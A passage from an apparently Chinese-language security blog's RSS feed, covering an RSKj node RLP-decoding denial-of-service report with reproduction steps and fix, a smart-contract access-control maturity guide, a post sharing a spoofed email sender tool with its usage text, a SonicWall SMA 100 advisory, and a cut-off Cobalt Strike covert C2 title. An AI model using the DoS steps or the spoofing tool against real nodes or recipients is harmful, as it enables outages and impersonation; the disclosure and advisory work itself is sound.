&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;下载受影响版本：https://github.com/rsksmart/rskj/releases/download/FINGERROOT-5.0.0/rskj-core-5.0.0-FINGERROOT-all.jar&lt;/li&gt;
&lt;li&gt;服务端运行：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;java&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;classpath&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rskj&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;core&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FINGERROOT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;all&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;jar&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Drpc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;providers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;web&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;cors&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Drpc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;providers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;web&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ws&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;enabled&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;co&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;rsk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Start&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;该命令会开放UDPv6端口5050&lt;/li&gt;
&lt;li&gt;客户端安装Python3及pysha3库，使用PoC脚本攻击服务端&lt;/li&gt;
&lt;li&gt;服务器将永久处理单个UDP数据包，拒绝其他节点请求，数分钟后应用崩溃&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;根本原因&#34;&gt;根本原因
&lt;/h2&gt;&lt;p&gt;&lt;code&gt;bytesToLength&lt;/code&gt;函数返回-5导致length变为0：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// RLP.java第432行&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bytesToLength返回&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 第440行&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;该返回值被合法接受&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 第403-405行&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;position变量无法更新&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;影响&#34;&gt;影响
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;UDPv6端口5050停止处理入站流量&lt;/li&gt;
&lt;li&gt;最终导致内存耗尽崩溃&lt;/li&gt;
&lt;li&gt;由于&lt;code&gt;decode2&lt;/code&gt;函数的广泛使用，可能影响其他服务入口点&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;修复方案&#34;&gt;修复方案
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;限制&lt;code&gt;bytesToLength&lt;/code&gt;仅返回非负值&lt;/li&gt;
&lt;li&gt;添加长度校验（建议）：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Integer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;BYTES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(...);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;修复提交&#34;&gt;修复提交
&lt;/h2&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/rsksmart/rskj/commit/6965fa60f743d911ee106b542cec80a1417266b1&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/rsksmart/rskj/commit/6965fa60f743d911ee106b542cec80a1417266b1&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞奖励&#34;&gt;漏洞奖励
&lt;/h2&gt;&lt;p&gt;$5,000&lt;/p&gt;
</description>
        </item>
        <item>
        <title>超越私钥风险：智能合约安全成熟度进阶指南</title>
        <link>http://localhost:1313/p/%E8%B6%85%E8%B6%8A%E7%A7%81%E9%92%A5%E9%A3%8E%E9%99%A9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E6%88%90%E7%86%9F%E5%BA%A6%E8%BF%9B%E9%98%B6%E6%8C%87%E5%8D%97/</link>
        <pubDate>Sat, 02 Aug 2025 20:14:41 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%B6%85%E8%B6%8A%E7%A7%81%E9%92%A5%E9%A3%8E%E9%99%A9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E6%88%90%E7%86%9F%E5%BA%A6%E8%BF%9B%E9%98%B6%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h1 id=&#34;超越私钥风险智能合约安全成熟度进阶&#34;&gt;超越私钥风险：智能合约安全成熟度进阶
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;&amp;ldquo;找出所有漏洞！&amp;rdquo;&lt;/strong&gt;&lt;br&gt;
这是大多数协议在部署智能合约前的安全口号。团队投入巨资进行审计、竞赛、模糊测试和形式化验证，试图发现每个潜在漏洞。但去年加密货币被盗的最大原因并非智能合约漏洞——而是私钥泄露！&lt;/p&gt;
&lt;h2 id=&#34;私钥攻击已成头号威胁&#34;&gt;私钥攻击已成头号威胁
&lt;/h2&gt;&lt;p&gt;根据Chainalysis 2024年报告，43.8%的被盗资金源于私钥泄露，是其他攻击类型的五倍之多。私钥泄露已成为每个工程师设计新智能合约时必须考虑的新兴威胁。&lt;/p&gt;
&lt;p&gt;传统区块链安全审计往往忽视架构层面的访问控制风险。与其他行业不同，区块链安全评估很少将权限升级和访问控制设计作为核心关注点。Trail of Bits通过代码库成熟度评估标记架构问题，但多数协议直到开发生命周期末期才寻求外部审查。&lt;/p&gt;
&lt;h2 id=&#34;案例研究超额抵押借贷平台&#34;&gt;案例研究：超额抵押借贷平台
&lt;/h2&gt;&lt;p&gt;我们以理论上的超额抵押借贷平台为例，展示不同成熟度的访问控制设计：&lt;/p&gt;
&lt;h3 id=&#34;等级1高风险暴露---单一eoa控制器&#34;&gt;等级1：高风险暴露 - 单一EOA控制器
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;单个外部账户(EOA)控制所有管理功能&lt;/li&gt;
&lt;li&gt;私钥可能存储在联网的软件钱包中&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;成熟度等级1&lt;/strong&gt;：单点故障，一旦私钥泄露即导致协议完全沦陷&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;等级2基础缓解---中心化多签&#34;&gt;等级2：基础缓解 - 中心化多签
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;管理权转移至多签钱包（如M-of-N Safe Wallet）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;成熟度等级2&lt;/strong&gt;：需要多个签名，但仍存在单一控制点&lt;/li&gt;
&lt;li&gt;改进：单个签名者密钥泄露不足以致命&lt;/li&gt;
&lt;li&gt;风险：足够多签名者被攻陷仍可立即执行恶意操作&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;等级3增强控制---时间锁与角色分离&#34;&gt;等级3：增强控制 - 时间锁与角色分离
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;实施时间锁合约（执行延迟）和最小权限原则(PoLP)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;成熟度等级3&lt;/strong&gt;：深度防御体系&lt;/li&gt;
&lt;li&gt;典型协议：Aave、Compound Finance、Lido&lt;/li&gt;
&lt;li&gt;关键角色：
&lt;ul&gt;
&lt;li&gt;核心系统角色（合约升级）：高门槛多签+长时间锁&lt;/li&gt;
&lt;li&gt;运营角色（日常配置）：中等时间锁和签名门槛&lt;/li&gt;
&lt;li&gt;暂停监护角色（紧急暂停）：无时间锁+低门槛&lt;/li&gt;
&lt;li&gt;取消监护角色（中止交易）：安全团队控制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;等级4终极形态---彻底不可变与用户主权&#34;&gt;等级4：终极形态 - 彻底不可变与用户主权
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;完全消除管理操作需求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;成熟度等级4&lt;/strong&gt;：近乎无控制点的不可变系统&lt;/li&gt;
&lt;li&gt;典型协议：Uniswap、Liquity&lt;/li&gt;
&lt;li&gt;设计挑战：
&lt;ul&gt;
&lt;li&gt;合约完全不可升级（需部署新系统）&lt;/li&gt;
&lt;li&gt;资产上架需独立部署新市场&lt;/li&gt;
&lt;li&gt;风险参数永久固定或算法决定&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;优势：彻底消除访问控制风险&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;设计韧性而非被动应对&#34;&gt;设计韧性而非被动应对
&lt;/h2&gt;&lt;p&gt;2024年43.8%的被盗资金证明，忽视架构级访问控制已不可接受。建议立即行动：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;对照成熟度框架评估当前协议&lt;/li&gt;
&lt;li&gt;为高风险功能实施时间锁并确保监控&lt;/li&gt;
&lt;li&gt;按最小权限原则划分特权功能&lt;/li&gt;
&lt;li&gt;考虑部分组件采用等级4不可变模式&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在Trail of Bits，我们提倡这种安全整体观。通过设计审查和早期咨询等服务，帮助团队主动解决这些基础问题。构建安全的去中心化系统不仅需要漏洞狩猎，更需从第一天就开始设计运营韧性。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Python与PHP实现的伪造邮件发送工具(SEMS)</title>
        <link>http://localhost:1313/p/python%E4%B8%8Ephp%E5%AE%9E%E7%8E%B0%E7%9A%84%E4%BC%AA%E9%80%A0%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%E5%B7%A5%E5%85%B7sems/</link>
        <pubDate>Sat, 02 Aug 2025 20:03:36 +0800</pubDate>
        
        <guid>http://localhost:1313/p/python%E4%B8%8Ephp%E5%AE%9E%E7%8E%B0%E7%9A%84%E4%BC%AA%E9%80%A0%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%E5%B7%A5%E5%85%B7sems/</guid>
        <description>&lt;h1 id=&#34;python-php-伪造邮件发送工具sems&#34;&gt;[Python] [PHP] 伪造邮件发送工具(SEMS)
&lt;/h1&gt;&lt;p&gt;今天我要向大家展示另一个我在空闲时间完成的趣味项目——伪造邮件发送工具。与其他工具不同，该工具使用PHP mail()函数处理邮件，因此需要支持PHP mail()功能的主机服务来托管邮件处理器。&lt;/p&gt;
&lt;h2 id=&#34;使用前准备&#34;&gt;使用前准备
&lt;/h2&gt;&lt;p&gt;在使用此工具前，您需要将mailhandler文件夹中的两个文件(index.php和send.php)托管在支持PHP mail()功能的主机服务上。否则该工具将无法工作。&lt;/p&gt;
&lt;p&gt;完成后，工具会要求输入邮件处理器URL(仅首次使用时)。您需要复制已托管的send.php文件URL并粘贴到输入框中。&lt;/p&gt;
&lt;h2 id=&#34;工具使用方法&#34;&gt;工具使用方法
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;usage: python3 sems.py [-h] [--sN SN] [--sE SE] [--rE RE] [--sub SUB] [--msg MSG]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Simple Port Scanner for scanning TCP ports in target hosts
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;optional arguments:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -h, --help  show this help message and exit
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  --sN SN     Sender Name (Eg: &amp;#34;John Cena&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  --sE SE     Sender E-Mail Address (Eg: johncena@wwe.com)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  --rE RE     Recipient E-Mail Address (Eg: chan.96@gmail.com)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  --sub SUB   Type Subject (Eg: &amp;#34;See Me Chan&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  --msg MSG   Type Message (Eg: &amp;#34;You can see me brother. I know that.&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;希望您会喜欢我的代码。此工具可自由修改，您可以按需进行任何更改。我已为此创建了GitHub仓库。&lt;/p&gt;
&lt;p&gt;您可以通过以下链接查看和下载：
&lt;a class=&#34;link&#34; href=&#34;https://github.com/clasiru/Spoofed_E-Mail_Sender&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/clasiru/Spoofed_E-Mail_Sender&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>SonicWall SMA 100系列管理界面多重漏洞可能导致远程代码执行</title>
        <link>http://localhost:1313/p/sonicwall-sma-100%E7%B3%BB%E5%88%97%E7%AE%A1%E7%90%86%E7%95%8C%E9%9D%A2%E5%A4%9A%E9%87%8D%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%83%BD%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</link>
        <pubDate>Sat, 02 Aug 2025 19:42:30 +0800</pubDate>
        
        <guid>http://localhost:1313/p/sonicwall-sma-100%E7%B3%BB%E5%88%97%E7%AE%A1%E7%90%86%E7%95%8C%E9%9D%A2%E5%A4%9A%E9%87%8D%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%83%BD%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</guid>
        <description>&lt;h1 id=&#34;sonicwall-secure-mobile-access-sma-100系列管理界面多重漏洞可能导致远程代码执行&#34;&gt;SonicWall Secure Mobile Access (SMA) 100系列管理界面多重漏洞可能导致远程代码执行
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;MS-ISAC公告编号&lt;/strong&gt;：2025-046&lt;br&gt;
&lt;strong&gt;发布日期&lt;/strong&gt;：2025/05/05&lt;/p&gt;
&lt;h2 id=&#34;概述&#34;&gt;概述
&lt;/h2&gt;&lt;p&gt;SonicWall Secure Mobile Access (SMA) 100管理界面发现多个安全漏洞，可能导致远程代码执行。SonicWall SMA是企业用于提供远程应用访问的统一安全网关。攻击者组合利用这些漏洞可实现远程代码执行，进而导致会话劫持和系统完全沦陷。&lt;/p&gt;
&lt;h2 id=&#34;威胁情报&#34;&gt;威胁情报
&lt;/h2&gt;&lt;p&gt;WatchTowr报告显示CVE-2024-38475和CVE-2023-44221已在真实攻击中被利用。CISA已将这两个漏洞列入已知被利用漏洞目录(KEV)。&lt;/p&gt;
&lt;h2 id=&#34;受影响系统&#34;&gt;受影响系统
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;SMA 200&lt;/li&gt;
&lt;li&gt;SMA 210&lt;/li&gt;
&lt;li&gt;SMA 400&lt;/li&gt;
&lt;li&gt;SMA 410&lt;/li&gt;
&lt;li&gt;SMA 500v&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;风险等级&#34;&gt;风险等级
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;政府机构：中大型政府实体(高危)/小型政府实体(中危)&lt;/li&gt;
&lt;li&gt;企业：中大型企业(高危)/小型企业(中危)&lt;/li&gt;
&lt;li&gt;家庭用户：低危&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h2&gt;&lt;p&gt;漏洞详情如下：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击策略&lt;/strong&gt;：初始访问(TA0001)&lt;br&gt;
&lt;strong&gt;技术手段&lt;/strong&gt;：利用公开应用漏洞(T1190)：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;SMA100 SSL-VPN管理界面存在特殊元素过滤不当漏洞，具有管理员权限的远程攻击者可注入任意命令(CVE-2023-44221)&lt;/li&gt;
&lt;li&gt;Apache HTTP Server 2.4.59及更早版本的mod_rewrite存在输出转义缺陷，攻击者可映射URL到服务器允许访问的文件系统位置(CVE-2024-38475)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;组合利用这些漏洞可实现远程代码执行。&lt;/p&gt;
&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;立即应用补丁&lt;/strong&gt;：测试后立即安装SonicWall提供的更新(M1051)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保障措施7.1：建立并维护漏洞管理流程&lt;/li&gt;
&lt;li&gt;保障措施7.2：建立基于风险的修复策略&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;自动化漏洞管理&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保障措施7.4：每月执行自动化应用补丁管理&lt;/li&gt;
&lt;li&gt;保障措施7.5：每季度执行自动化漏洞扫描&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;网络架构加固&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保障措施12.1：保持网络基础设施更新&lt;/li&gt;
&lt;li&gt;保障措施12.2：建立安全网络架构&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;渗透测试&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保障措施18.1：建立渗透测试计划&lt;/li&gt;
&lt;li&gt;保障措施18.2：定期执行外部渗透测试&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;最小权限原则&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保障措施4.7：管理默认账户&lt;/li&gt;
&lt;li&gt;保障措施5.5：维护服务账户清单&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;应用防护&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保障措施16.13：执行应用渗透测试&lt;/li&gt;
&lt;li&gt;保障措施10.5：启用防漏洞利用功能&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;参考链接&#34;&gt;参考链接
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.cisa.gov/news-events/alerts/2025/05/01/cisa-adds-two-known-exploited-vulnerabilities-catalog&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CISA公告&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-38475&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CVE-2024-38475&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-44221&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CVE-2023-44221&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2023-0018&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;SonicWall安全公告&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>在Cobalt Strike中利用DNS over HTTPS实现隐蔽命令控制</title>
